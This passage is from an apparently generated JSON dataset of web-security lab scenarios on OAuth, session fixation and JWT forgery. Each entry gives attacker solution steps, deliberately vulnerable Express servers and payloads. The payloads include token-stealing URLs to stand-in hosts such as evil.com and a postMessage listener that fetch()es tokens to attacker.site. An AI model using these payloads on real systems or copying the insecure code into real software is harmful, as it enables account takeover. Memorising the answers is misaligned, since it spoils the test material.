      "1. Intercept the OAuth flow using Burp Suite during login and observe the 'redirect_uri' parameter.",
      "2. Register a domain like evil.com and host a server on oauth.evil.com.",
      "3. Replace the redirect_uri with https://oauth.evil.com/callback and capture the authorization code in the query string.",
      "4. Use Postman to send a POST request to the token endpoint with the stolen code and redirect_uri set to your malicious domain.",
      "5. Use the access token to call the /me endpoint and confirm access to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const authorizedRedirects = ['https://trusted.com/callback']; const tokens = {}; app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const code = 'authcode123'; tokens[code] = 'carlos-token'; res.redirect(`${redirect_uri}?code=${code}`); }); app.post('/token', (req, res) => { const { code, redirect_uri } = req.body; if (tokens[code]) { res.json({ access_token: tokens[code] }); } else { res.status(400).send('Invalid code'); } }); app.get('/me', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-token') { res.send('Carlos account access granted'); } else { res.status(403).send('Forbidden'); } }); app.listen(5000, () => console.log('OAuth Misconfig Lab at http://localhost:5000'));",
    "payloads": [
      "https://oauth.evil.com/callback",
      "POST /token with stolen code and malicious redirect_uri",
      "Authorization: Bearer carlos-token"
    ]
  },
  {
    "Lab scenario": "GraphQL Session Fixation in Login Token Exchange",
    "Lab Description": "The application's GraphQL login mutation is vulnerable to session fixation. The application issues a session token before authentication and does not invalidate it after login. To solve: exploit session fixation to hijack Carlos's session and access his profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a GraphQL mutation for login. Note the issued session cookie before authentication.",
      "2. Replay the pre-login GraphQL mutation from Postman and capture the Set-Cookie header.",
      "3. Send this session ID to the victim via phishing or predict a reusable ID if predictable.",
      "4. Log in as the victim using the same session token. Observe that the session is still valid post-login.",
      "5. Access /graphql with query: { profile { username email } } using the hijacked session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); app.use(session({ secret: 'insecure', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'hunter2' }]; const schema = buildSchema(`type Query { profile: User } type Mutation { login(username: String!, password: String!): String } type User { username: String, email: String }`); const root = { login: ({ username, password }, req) => { const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; return 'Login successful'; } return 'Login failed'; }, profile: (args, req) => { if (req.session.user) { return { username: req.session.user, email: req.session.user + '@example.com' }; } throw new Error('Unauthorized'); } }; app.use('/graphql', graphqlHTTP((req) => ({ schema, rootValue: root, graphiql: true }))); app.listen(4000);",
    "payloads": [
      "mutation { login(username: \"carlos\", password: \"hunter2\") }",
      "query { profile { username email } }"
    ]
  },
  {
    "Lab scenario": "JWT Token Tampering in Authorization Header",
    "Lab Description": "The application's JWT authentication relies solely on the 'alg' header value and fails to enforce a server-side signature check. This allows the use of 'none' algorithm to forge valid tokens. To solve: forge a token that impersonates carlos and access the /admin page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept the Authorization header after logging in with your own credentials using Burp Suite.",
      "2. Decode the JWT using jwt.io and note the 'alg' and 'kid' values in the header.",
      "3. Modify the JWT header to use 'alg':'none' and remove the signature portion.",
      "4. Change the payload to impersonate carlos: { \"username\":\"carlos\", \"role\":\"admin\" }.",
      "5. Send a GET request to /admin with the forged JWT in the Authorization header using Postman."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'pass123', role: 'admin' }]; const secret = 'topsecret'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, secret, { algorithm: 'HS256' }); return res.json({ token }); } res.status(403).send('Invalid'); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { req.user = decoded.payload; return res.send('Admin Panel - Welcome ' + req.user.username); } try { const verified = jwt.verify(token, secret); if (verified.role === 'admin') return res.send('Admin Panel - Verified'); } catch (e) { res.status(403).send('Unauthorized'); } }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "Authorization: Bearer <forged_token>"
    ]
  },
  {
    "Lab scenario": "OAuth Implicit Grant Open Redirect in Callback Handler",
    "Lab Description": "The OAuth flow uses the implicit grant type with an insecure open redirect vulnerability in the redirect_uri. This enables stealing the access token via a malicious redirect endpoint. To solve: exploit the redirect_uri to capture Carlos's access token and access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to initiate an OAuth login flow and capture the authorization URL.",
      "2. Note the use of response_type=token and redirect_uri pointing to /oauth-callback.",
      "3. Modify the redirect_uri to point to your own malicious server (e.g., https://evil.com#access_token=).",
      "4. Trick the victim into clicking the malicious OAuth URL to redirect the token to your server.",
      "5. Replay the stolen token against GET /user/profile with the Authorization header in Postman."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'abc123-token-carlos' }; const users = [{ username: 'carlos', profile: 'Sensitive profile info' }]; app.get('/authorize', (req, res) => { const { response_type, client_id, redirect_uri } = req.query; if (response_type === 'token' && redirect_uri) { return res.redirect(`${redirect_uri}#access_token=abc123-token-carlos`); } res.send('Invalid request'); }); app.get('/user/profile', (req, res) => { const auth = req.headers['authorization']; const token = auth && auth.split(' ')[1]; if (Object.values(tokens).includes(token)) { return res.send('Sensitive profile info of carlos'); } res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "https://vulnerable-app.com/authorize?response_type=token&client_id=123&redirect_uri=https://evil.com",
      "Authorization: Bearer abc123-token-carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation in login workflow via manipulated session token",
    "Lab Description": "The application uses a fixed session token before and after login, allowing session fixation. The session ID is issued before authentication and persists after login without regeneration. The application reflects the session cookie in verbose logs, enabling pre-auth hijacking. To solve: Fixate a session token pre-login and use it post-login to access Carlos's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET /login request and capture the Set-Cookie header",
      "Verify the same session token remains valid after successful login by replaying it",
      "Craft a phishing request sending a malicious session ID to the victim before login",
      "Use the fixed session ID post-victim login to hijack the session",
      "Verify access to /account/carlos and capture the session token to complete the lab"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'pass123' }]; app.use((req, res, next) => { if (!req.cookies.session_id) { const sid = 'sess_' + Math.random().toString(36).substring(2); sessions[sid] = { username: null }; res.cookie('session_id', sid); console.log('Generated new session:', sid); } next(); }); app.post('/login', (req, res) => { const sid = req.cookies.session_id; const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sid].username = username; res.send('Login successful'); } else { res.status(401).send('Invalid login'); } }); app.get('/account/:user', (req, res) => { const sid = req.cookies.session_id; if (sessions[sid] && sessions[sid].username === req.params.user) { res.send('Access granted to ' + req.params.user); } else { res.status(403).send('Access denied'); } }); app.listen(5000, () => console.log('Session Fixation Lab running on http://localhost:5000'));",
    "payloads": [
      "Set-Cookie: session_id=sess_attacker123;",
      "POST /login HTTP/1.1 with session_id=sess_attacker123",
      "GET /account/carlos with Cookie: session_id=sess_attacker123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion with none bypass",
    "Lab Description": "The application uses JWT for session authentication. It verifies JWT tokens using a symmetric secret and allows tokens with alg=none due to misconfiguration. An attacker can craft a token with alg=none and no signature to impersonate any user. To solve: Forge a JWT with alg=none and access Carlos's profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture the Authorization header with the JWT token",
      "Decode the JWT and identify the 'alg' field is set to HS256",
      "Modify the token to use alg=none and remove the signature",
      "Inject a forged payload with sub set to 'carlos'",
      "Send the modified token and verify access to /api/user/carlos"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'secretkey123'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ sub: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/user/:id', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('Unauthorized'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.sub === req.params.id) return res.send('Access granted to ' + decoded.sub); else return res.status(403).send('Forbidden'); } try { const verified = jwt.verify(token, secret); if (verified.sub === req.params.id) res.send('Access granted to ' + verified.sub); else res.status(403).send('Forbidden'); } catch (e) { res.status(403).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on http://localhost:4000'));",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"sub\":\"carlos\"}",
      "JWT: base64url(header).base64url(payload).",
      "Authorization: Bearer [forged_token]"
    ]
  },
  {
    "Lab scenario": "OAuth redirect_uri manipulation for code leakage",
    "Lab Description": "The application implements OAuth login via a third-party provider. However, the redirect_uri parameter is vulnerable to manipulation, allowing an attacker to intercept the authorization code. To solve: Exploit the redirect_uri parameter to leak the OAuth code and complete login as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the OAuth authorization redirect request",
      "Locate the redirect_uri parameter and replace it with an attacker-controlled domain",
      "Trigger an OAuth login flow with the modified redirect_uri",
      "Capture the authorization code from the attacker server logs",
      "Exchange the leaked code for a valid access_token and authenticate as Carlos"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const oauth_url = `https://auth.provider.com/oauth?client_id=app123&redirect_uri=${redirect_uri}&response_type=code`; res.redirect(oauth_url); }); app.get('/callback', (req, res) => { const { code } = req.query; request.post('https://auth.provider.com/token', { form: { code, client_id: 'app123', client_secret: 'secret', redirect_uri: 'http://localhost:3000/callback' }}, (err, resp, body) => { if (body.includes('access_token')) res.send('Logged in'); else res.status(403).send('OAuth failed'); }); }); app.listen(3000, () => console.log('OAuth Redirect URI Lab running on http://localhost:3000'));",
    "payloads": [
      "redirect_uri=https://attacker.com/capture",
      "GET /auth?redirect_uri=https://attacker.com/capture",
      "Captured code=xyz from attacker.com server logs",
      "POST to /token with captured code",
      "Access /callback with valid access_token"
    ]
  },
  {
    "Lab scenario": "OAuth session fixation in SSO redirect flow",
    "Lab Description": "The application uses OAuth for single sign-on (SSO) integration with a third-party provider. The vulnerable component mishandles session identifiers across redirection endpoints. The application fails to regenerate the session token after completing OAuth login, allowing an attacker to fixate the session ID prior to victim login. To solve: hijack Carlos's session by setting a fixed session cookie prior to their OAuth login flow.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the initial GET /login/oauth request and analyze the redirection to the OAuth provider.",
      "2. Log in with your own account using OAuth, observe that the session cookie remains unchanged before and after login.",
      "3. In Burp, craft a malicious link to initiate OAuth login with a predefined session cookie using the Set-Cookie header injection via a redirect.",
      "4. Send the crafted OAuth login link to Carlos (simulated), ensuring the same fixed session ID is assigned before authentication completes.",
      "5. After Carlos completes login, reuse the fixed session ID to access /account and confirm access to Carlos's session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'insecure-oauth', resave: false, saveUninitialized: true })); app.get('/login/oauth', (req, res) => { const state = req.query.state || 'xyz'; const redirect = `https://oauth-provider/auth?client_id=123&redirect_uri=http://localhost:4000/callback&state=${state}`; res.redirect(redirect); }); app.get('/callback', (req, res) => { req.session.user = 'carlos'; res.redirect('/account'); }); app.get('/account', (req, res) => { if (!req.session.user) return res.send('Login required'); res.send(`Account data for ${req.session.user}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Set-Cookie: connect.sid=sess:attack123",
      "https://target.com/login/oauth?next=%2Fcallback",
      "OAuth redirect with fixed Set-Cookie header",
      "Reuse session cookie: connect.sid=sess:attack123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm tampering in SOAP login endpoint",
    "Lab Description": "This lab’s SOAP-based login API relies on JWT tokens to manage user sessions. The server incorrectly trusts the algorithm field of incoming tokens, allowing attackers to bypass signature validation by switching to the 'none' algorithm. To solve: generate a JWT token with alg=none and impersonate Carlos.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to inspect the SOAP request to the /soap-auth endpoint and capture the JWT token.",
      "2. Decode the token using jwt.io or Burp Decoder and observe that it is signed with HS256.",
      "3. Modify the token header to use 'alg':'none' and remove the signature.",
      "4. Change the payload to impersonate user 'carlos' and replay the token in the SOAP request.",
      "5. Access /soap-user?username=carlos and verify you’re authenticated as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.text({ type: 'application/soap+xml' })); app.post('/soap-auth', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; try { const decoded = jwt.verify(token, 'secretkey'); res.send(`<soap:Envelope><soap:Body>Welcome ${decoded.user}</soap:Body></soap:Envelope>`); } catch (e) { res.status(403).send('<soap:Envelope><soap:Body>Access Denied</soap:Body></soap:Envelope>'); } }); app.get('/soap-user', (req, res) => { res.send(`SOAP Account page for ${req.query.username}`); }); const PORT = 5000; app.listen(PORT, () => console.log(`JWT None SOAP Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "{ \"alg\": \"none\", \"typ\": \"JWT\" }",
      "{ \"user\": \"carlos\" }",
      "Header: Authorization: Bearer <unsigned_token>",
      "SOAP request with forged token"
    ]
  },
  {
    "Lab scenario": "GraphQL session fixation via token injection",
    "Lab Description": "The application uses GraphQL for authentication and session establishment. It insecurely accepts a user-provided token through a GraphQL mutation and sets it as the session token without validation. To solve: fixate a session token for Carlos by injecting a token value pre-login, then use that token to hijack the session post-login.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman or Burp to send a GraphQL mutation to /graphql with a hardcoded token value.",
      "2. Analyze the response headers and observe the Set-Cookie header reflects your custom token.",
      "3. Simulate the attack by sending the token injection to Carlos’s browser (simulated).",
      "4. Wait for Carlos to complete login; he will inherit the fixed token.",
      "5. Reuse the same token in your session cookie to access /graphql/account and confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const sessions = {}; app.use(bodyParser.json()); app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('login')) { const token = req.body.variables.token || `sess_${Math.random()}`; sessions[token] = req.body.variables.username; res.cookie('session', token); return res.send({ data: { login: 'Logged in' } }); } if (query.includes('account')) { const token = req.cookies.session; const user = sessions[token]; return res.send({ data: { user } }); } res.send({ error: 'Invalid query' }); }); const PORT = 6000; app.listen(PORT, () => console.log(`GraphQL Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "mutation login($username: String!, $token: String!) { login(username: $username, token: $token) }",
      "{ \"username\": \"carlos\", \"token\": \"fixed-session-token\" }",
      "Cookie: session=fixed-session-token",
      "query { account { user } }"
    ]
  },
  {
    "Lab scenario": "Legacy session fixation vulnerability in REST login flow",
    "Lab Description": "The application's login flow does not invalidate existing session cookies when a user logs in. The session token is preserved from the unauthenticated state to the authenticated state. This allows an attacker to fixate a session ID and trick a victim into authenticating with it. The application sets session cookies before login and reuses them post-authentication. To solve: Fixate a session ID, trick Carlos into logging in with it, then use it to access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept GET /login and note the issued Set-Cookie header for sessionId.",
      "Send a crafted link to Carlos with a preset sessionId using Burp Collaborator or intercepted client-side script.",
      "After Carlos logs in, reuse the fixed sessionId from step 1 in a GET /my-account request.",
      "Confirm that the fixed session is now authenticated as Carlos.",
      "Access /my-account using the session to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const sessions = {}; const users = [{ username: 'carlos', password: 'password123' }]; app.get('/login', (req, res) => { let sid = req.cookies.sid || Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('sid', sid); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sid; if (sid && sessions[sid]) { sessions[sid].authenticated = true; sessions[sid].username = username; res.send('Logged in'); } else { res.status(400).send('Session missing'); } } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sid && sessions[sid] && sessions[sid].authenticated) { res.send(`Welcome ${sessions[sid].username}`); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "Set-Cookie: sid=attacker-fixed-id;",
      "GET /my-account with sid after victim login",
      "Use <script> to preload fixed cookie"
    ]
  },
  {
    "Lab scenario": "JWT kid header injection in SOAP authentication handler",
    "Lab Description": "The application's SOAP-based authentication endpoint uses JWTs with a vulnerable `kid` header, allowing injection of a local file path. The application uses `fs.readFileSync(kid)` to load the secret key. To solve: Forge a valid JWT for Carlos using key injection via the `kid` header and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to send a login request to /authService via SOAP XML.",
      "Extract and analyze the JWT from the response and decode it using jwt.io.",
      "Modify the `kid` header in the JWT to point to a known file path (e.g., /dev/null or public.pem).",
      "Use Node.js to forge a new JWT with the modified header and payload `{ \"username\": \"carlos\" }`.",
      "Send the forged token via SOAP header and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const fs = require('fs'); const jwt = require('jsonwebtoken'); const xmlparser = require('express-xml-bodyparser'); const app = express(); app.use(xmlparser()); app.post('/authService', (req, res) => { const token = req.body?.Envelope?.Header?.[0]?.AuthToken?.[0]; const decodedHeader = JSON.parse(Buffer.from(token.split('.')[0], 'base64').toString()); const secret = fs.readFileSync(decodedHeader.kid); try { const verified = jwt.verify(token, secret); if (verified.username === 'carlos') { res.send('<soap:Envelope><soap:Body>Access Granted</soap:Body></soap:Envelope>'); } else { res.send('<soap:Envelope><soap:Body>Access Denied</soap:Body></soap:Envelope>'); } } catch { res.send('<soap:Envelope><soap:Body>Invalid Token</soap:Body></soap:Envelope>'); } }); app.listen(5000);",
    "payloads": [
      "{ \"alg\": \"HS256\", \"kid\": \"../../public.pem\" }",
      "JWT header: eyJhbGciOiAiSFMyNTYiLCAia2lkIjogIi4uLy4uL3B1YmxpYy5wZW0ifQ==",
      "JWT payload: eyJ1c2VybmFtZSI6ICJjYXJsb3MifQ=="
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in client-side implicit grant flow",
    "Lab Description": "The application uses OAuth with implicit flow for single-page applications. It trusts any `redirect_uri` that matches the domain but fails to validate origin during `postMessage`. An attacker can inject a malicious frame to steal tokens. To solve: Steal Carlos's access token using a crafted frame and use it to access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to retrieve a valid OAuth authorization URL from /auth?client_id=spaclient&response_type=token.",
      "Craft a malicious HTML page that loads the login endpoint in an iframe and listens for postMessage from the origin.",
      "Send the URL to Carlos using social engineering and capture the access token via postMessage hijack.",
      "Replay the access token in an Authorization header using Burp to access /my-account.",
      "Verify Carlos's account access using the stolen token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'token-carlos-abc123' }; app.get('/auth', (req, res) => { const { client_id, response_type, redirect_uri } = req.query; if (client_id === 'spaclient' && response_type === 'token') { res.redirect(`${redirect_uri}#access_token=token-carlos-abc123`); } else { res.status(400).send('Invalid request'); } }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (Object.values(tokens).includes(token)) { res.send('Welcome carlos'); } else { res.status(401).send('Unauthorized'); } }); app.listen(7000);",
    "payloads": [
      "<iframe src='https://vulnerable.app/auth?client_id=spaclient&response_type=token&redirect_uri=https://attacker.site/capture.html'></iframe>",
      "window.addEventListener('message', e => fetch('https://attacker.site/log?token=' + e.data))",
      "Authorization: Bearer token-carlos-abc123"
    ]
  },
  {
    "Lab scenario": "Session fixation in login flow with cookie reuse",
    "Lab Description": "The application contains a session fixation vulnerability within its authentication logic. It allows unauthenticated users to assign session identifiers that are not reset during login. The application accepts a session cookie before login and continues using it post-authentication. To solve: Fixate your session before login, authenticate as Carlos, and access his My Account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. In Burp Suite, intercept a GET /login request before logging in. Note the Set-Cookie: sessionid value assigned.",
      "2. Use Burp to send a crafted link with your chosen sessionid to Carlos or set it manually as a valid cookie.",
      "3. Log in with Carlos's credentials while your pre-defined sessionid is active.",
      "4. Observe that the sessionid does not change after login, confirming session fixation.",
      "5. Use the fixed sessionid to access /account and confirm access to Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = { 'carlos': 'hunter2' }; const sessions = {}; app.get('/login', (req, res) => { if (!req.cookies.sessionid) { const sid = Math.random().toString(36).substring(2); res.cookie('sessionid', sid); sessions[sid] = { loggedIn: false }; } res.send('Login Page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sessionid; if (users[username] === password) { sessions[sid] = { loggedIn: true, user: username }; res.redirect('/account'); } else { res.send('Invalid'); } }); app.get('/account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid]?.loggedIn) { res.send(`Welcome ${sessions[sid].user}`); } else { res.status(401).send('Not logged in'); } }); app.listen(3000);",
    "payloads": [
      "GET /login with custom sessionid injected",
      "POST /login with credentials: carlos:hunter2 and sessionid unchanged",
      "GET /account with sessionid to confirm access"
    ]
  },
  {
    "Lab scenario": "JWT tampering due to none algorithm in token verification",
    "Lab Description": "The application uses JWT tokens for user authentication. It does not properly validate the token signature if the 'alg' header is set to 'none'. The application trusts the token without signature verification. To solve: Craft a JWT for Carlos with alg=none and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to log in with your own credentials and capture the JWT from the Authorization header.",
      "2. Decode the JWT in jwt.io or use Postman’s JWT debugger. Observe the payload structure and header fields.",
      "3. Modify the 'alg' header to 'none' and change the payload 'sub' to 'carlos'.",
      "4. Remove the signature section completely and re-encode the JWT using base64url encoding.",
      "5. Send a GET /account request with the tampered token in the Authorization header and verify access to Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'insecurekey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ sub: username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); res.send(`Access granted to ${payload.sub}`); } else { try { const payload = jwt.verify(token, SECRET); res.send(`Access granted to ${payload.sub}`); } catch (e) { res.status(403).send('Invalid token'); } } }); app.listen(4000);",
    "payloads": [
      "Header: { \"alg\": \"none\" }, Payload: { \"sub\": \"carlos\" }, No signature",
      "Authorization: Bearer <tampered_token>"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration in redirect handling",
    "Lab Description": "This application implements OAuth using the implicit flow. The redirection URI is not properly validated, allowing open redirect and token leakage. The application trusts the redirect_uri without strict validation. To solve: Exploit the redirect_uri to capture Carlos’s access token and use it to access the protected /account endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP or Burp Suite to observe the OAuth flow during login. Capture the GET /authorize?client_id=X&redirect_uri=... request.",
      "2. Identify that the redirect_uri is weakly validated and allows external domains with similar patterns.",
      "3. Set up a malicious server to capture tokens from URL fragments.",
      "4. Craft a URL with redirect_uri pointing to your malicious endpoint, and trick Carlos into visiting it.",
      "5. Capture the access_token from the fragment, then send it in the Authorization header to GET /account and verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const oauthTokens = { 'carlos': 'access-token-123' }; app.get('/authorize', (req, res) => { const { redirect_uri, client_id, response_type } = req.query; const user = 'carlos'; const token = oauthTokens[user]; if (response_type === 'token') { res.redirect(`${redirect_uri}#access_token=${token}&token_type=bearer`); } else { res.status(400).send('Unsupported flow'); } }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === oauthTokens['carlos']) { res.send('Welcome Carlos!'); } else { res.status(403).send('Unauthorized'); } }); app.listen(5000);",
    "payloads": [
      "GET /authorize?client_id=app123&redirect_uri=https://attacker.com/callback&response_type=token",
      "Captured: #access_token=access-token-123",
      "Authorization: Bearer access-token-123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in token validation",
    "Lab Description": "This lab uses JSON Web Tokens (JWT) for session handling and is vulnerable to algorithm confusion. The application accepts tokens signed with 'none' instead of verifying them. To solve: craft a forged JWT token to impersonate the admin user and access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a valid JWT token from a logged-in session.",
      "2. Decode the JWT using jwt.io or Burp Decoder and observe the 'alg' field is set to HS256.",
      "3. Modify the JWT header to set 'alg' to 'none' and change the payload 'username' to 'admin'.",
      "4. Remove the signature part and forward the modified token using Burp Repeater.",
      "5. Access /admin route using the forged JWT to verify admin access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', role: 'admin' }, { username: 'user', role: 'user' }]; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, 'secretkey'); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.username === 'admin') return res.send('Welcome admin'); } try { const verified = jwt.verify(token, 'secretkey'); if (verified.username === 'admin') return res.send('Welcome admin'); } catch (err) { return res.status(401).send('Invalid token'); } res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation via token reuse in login flow",
    "Lab Description": "This application improperly binds session tokens to user identity. A malicious user can fixate a victim's session by planting a session cookie before login. To solve: hijack Carlos's session by fixing the session cookie and accessing his account page after he logs in.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to capture a request before login and observe the 'sessionid' cookie.",
      "2. Copy the sessionid value and set it as your session cookie.",
      "3. Trick Carlos into logging in using the sessionid you provided (simulate via forced browsing or social engineering).",
      "4. After Carlos logs in, reuse the fixed sessionid to access /my-account.",
      "5. Confirm access to Carlos’s account using the hijacked session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sessionid || Math.random().toString(36).substr(2); sessions[sid] = username; res.cookie('sessionid', sid); res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; const user = sessions[sid]; if (user === 'carlos') return res.send('Account page for carlos'); res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "sessionid=attackerfixedid",
      "GET /login?username=carlos&password=pass123 with attackerfixedid as cookie",
      "GET /my-account with sessionid=attackerfixedid"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration allows token reuse",
    "Lab Description": "This app uses OAuth for third-party authentication. It incorrectly accepts ID tokens from any issuer, failing to validate the issuer and audience. To solve: reuse an ID token from another provider to log in as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Log in using a different OAuth provider and intercept the ID token in the response using Burp Suite.",
      "2. Decode the JWT and observe the 'sub' and 'iss' claims.",
      "3. Modify the payload 'sub' to 'carlos' and change 'iss' to a fake issuer, re-sign the JWT using your own private key.",
